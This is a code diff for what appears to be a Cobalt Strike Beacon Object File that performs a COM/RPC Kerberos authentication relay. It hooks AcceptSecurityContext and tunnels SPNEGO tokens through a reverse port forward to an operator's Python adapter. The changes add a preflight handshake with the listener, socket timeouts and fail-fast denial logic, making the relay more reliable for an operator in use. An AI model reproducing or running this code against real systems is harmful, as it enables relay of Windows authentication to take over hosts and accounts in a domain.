@@ -107,20 +107,28 @@ BOF_IMPORT(WS2_32, void, WSAAPI, freeaddrinfo, (struct addrinfo *));
 BOF_IMPORT(WS2_32, int, WSAAPI, connect, (SOCKET, const struct sockaddr *, int));
 BOF_IMPORT(WS2_32, int, WSAAPI, send, (SOCKET, const char *, int, int));
 BOF_IMPORT(WS2_32, int, WSAAPI, recv, (SOCKET, char *, int, int));
+BOF_IMPORT(WS2_32, int, WSAAPI, setsockopt,
+           (SOCKET, int, int, const char *, int));
 BOF_IMPORT(WS2_32, int, WSAAPI, closesocket, (SOCKET));
 
 /* -------------------------------------------------------------------------
  * Wire protocol and state
  * ------------------------------------------------------------------------- */
-/* KRB1 v3 carries relay tokens. Authentication ends at AUTH_OK; any
+/* KRB1 v4 validates the bridge before COM, then carries relay tokens.
+ * Authentication ends at AUTH_OK; any
  * post-authentication operation and result belong to the Python adapter. */
+#define BRIDGE_PREFLIGHT    1
+#define BRIDGE_READY        2
 #define BRIDGE_CLIENT_TOKEN 3
 #define BRIDGE_SERVER_TOKEN 4
 #define BRIDGE_AUTH_OK      5
 #define BRIDGE_ERROR        6
-#define BRIDGE_VERSION      3
+#define BRIDGE_VERSION      4
 #define MAX_TOKEN           65535u
 #define MAX_ERROR           512u
+/* A missing or mismatched rport/Python listener must fail the authentication
+ * callback instead of leaving CoGetInstanceFromIStorage blocked indefinitely. */
+#define BRIDGE_IO_TIMEOUT_MS 30000u
 
 /* Numeric values are stable because operators use them to diagnose failures
  * reported after the worker exits. */
@@ -519,6 +527,7 @@ static int bridge_connect(void) {
     WSADATA wd;
     struct addrinfo hints, *addresses = NULL, *current;
     char service[6];
+    DWORD io_timeout = BRIDGE_IO_TIMEOUT_MS;
 
     /* A live socket preserves the remote service's SPNEGO state between legs. */
     if (g_state.bridge != INVALID_SOCKET) {
@@ -563,12 +572,28 @@ static int bridge_connect(void) {
     if (g_state.bridge == INVALID_SOCKET) {
         return 0;
     }
+
+    /* connect() can succeed against rportfwd_local even when that client-side
+     * forward targets the wrong Python port. Bound both halves of every KRB1
+     * exchange so the RPC callback can return a fatal auth result promptly. */
+    if (WS2_32$setsockopt(g_state.bridge, SOL_SOCKET, SO_RCVTIMEO,
+                          (const char *)&io_timeout,
+                          sizeof(io_timeout)) ||
+        WS2_32$setsockopt(g_state.bridge, SOL_SOCKET, SO_SNDTIMEO,
+                          (const char *)&io_timeout,
+                          sizeof(io_timeout))) {
+        WS2_32$closesocket(g_state.bridge);
+        g_state.bridge = INVALID_SOCKET;
+        return 0;
+    }
     return 1;
 }
 
 static ULONG record_limit(BYTE kind) {
     switch (kind) {
-        /* AUTH_OK is a terminal state marker and intentionally has no body. */
+        /* Control/terminal records are state markers and have no body. */
+        case BRIDGE_PREFLIGHT:
+        case BRIDGE_READY:
         case BRIDGE_AUTH_OK:
             return 0;
         /* Authentication payloads share the SSPI/RPC token ceiling. */
@@ -696,6 +721,37 @@ static int recv_auth_reply(BYTE *kind, BYTE **data, ULONG *length) {
         g_state.bridge_error_ready = 1;
     }
     return 0;
+}
+
+static int bridge_preflight(void) {
+    BYTE kind = 0;
+    BYTE *payload = NULL;
+    ULONG length = 0;
+    int ready = 0;
+
+    /* A complete request/response proves the target-side listener and
+     * client-local forward reach the intended Python endpoint. */
+    if (send_record(BRIDGE_PREFLIGHT, NULL, 0) &&
+        recv_record(&kind, &payload, &length) &&
+        kind == BRIDGE_READY && !length) {
+        ready = 1;
+    }
+    release(payload);
+    /* The probe socket belongs to the activation worker. Close it so the
+     * RPC callback opens the normal Kerberos socket on its own thread. */
+    if (ready) {
+        WS2_32$closesocket(g_state.bridge);
+        g_state.bridge = INVALID_SOCKET;
+    }
+    if (!ready) {
+        g_state.bridge_failed = 1;
+        g_state.stage = STAGE_RELAY_BRIDGE;
+        if (g_state.bridge != INVALID_SOCKET) {
+            WS2_32$closesocket(g_state.bridge);
+            g_state.bridge = INVALID_SOCKET;
+        }
+    }
+    return ready;
 }
 
 /* -------------------------------------------------------------------------
@@ -1415,6 +1471,22 @@ static SECURITY_STATUS SEC_ENTRY accept_hook(
                                   &temporary_output, attrs, expiry);
     release(temporary_buffer.pvBuffer);
 
+    /* If bridge setup or I/O failed, the isolated native output cannot be
+     * returned to RPCSS. Explicitly deny this association and clear every
+     * runtime token buffer so COM unwinds instead of waiting for another leg. */
+    if (g_state.bridge_failed) {
+        if (output && output->pBuffers) {
+            for (i = 0; i < output->cBuffers; i++) {
+                if ((output->pBuffers[i].BufferType & 0xffff) ==
+                    SECBUFFER_TOKEN) {
+                    output->pBuffers[i].cbBuffer = 0;
+                }
+            }
+        }
+        status = SEC_E_LOGON_DENIED;
+        goto accept_done;
+    }
+
     /* The target is already authenticated. Tear down this local RPC association so
        COM cannot retain and reuse its deliberately mismatched security state. */
     if (g_state.success) {
@@ -1872,6 +1944,13 @@ static int run_relay(void) {
     BeaconPrintf(CALLBACK_OUTPUT, "[*] Initializing COM/RPC relay\n");
     /* Do not activate if COM policy cannot emit Kerberos/Negotiate credentials. */
     if (!initialize_worker_com()) {
+        return 0;
+    }
+
+    /* Reject an absent/stale target-side listener before publishing any hook
+     * or RPC interface. accept_hook() later creates a separate token socket. */
+    g_state.stage = STAGE_RELAY_BRIDGE;
+    if (!bridge_connect() || !bridge_preflight()) {
         return 0;
     }
 
